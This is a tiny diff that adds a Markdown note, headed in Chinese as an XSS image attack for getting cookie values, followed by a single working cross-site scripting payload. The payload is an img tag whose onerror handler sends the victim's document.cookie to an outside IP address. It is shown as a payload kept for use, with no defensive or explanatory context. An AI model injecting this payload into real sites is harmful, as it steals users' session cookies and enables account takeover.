@@ -1,0 +1,2 @@
+## XSS圖片攻擊，取的cookie值
+<img src=1 onerror=this.src="http://10.10.xx.xx/?ccc="+encodeURIComponent(document.cookie)>
